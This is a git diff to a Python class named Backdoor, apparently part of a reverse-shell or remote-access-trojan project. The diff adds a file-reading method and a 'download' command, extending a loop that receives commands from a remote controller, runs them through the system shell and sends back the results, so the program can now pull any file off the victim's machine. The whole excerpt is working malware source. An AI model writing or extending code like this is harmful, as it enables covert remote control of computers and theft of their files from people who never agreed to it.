@@ -28,6 +28,10 @@ class Backdoor:
         os.chdir(path)
         return "[+] Changing working directory to " + path
 
+    def read_file(self, path):
+        with open(path,"rb") as file:
+            return file.read()
+
     def execute_sys_command(self, command):
         return subprocess.check_output(command, shell=True)
 
@@ -36,12 +40,19 @@ class Backdoor:
             # command = self.connection.recv(2048).decode()
             command = self.receive_json()
 
-            if(command[0].lower() == "exit"): #exit program
+            #exit program
+            if(command[0].lower() == "exit"):
                 self.connection.close()
                 exit()
 
+            #change directory
             elif(command[0] == "cd" and (len(command) > 1) ):
                 command_result = self.change_directory(command[1])
+
+            #download file
+            elif(command[0] == "download"):
+                command_result = self.read_file(command[1])
+
             else:
                 command_result = self.execute_sys_command(command)
                 # self.connection.send(command_result)
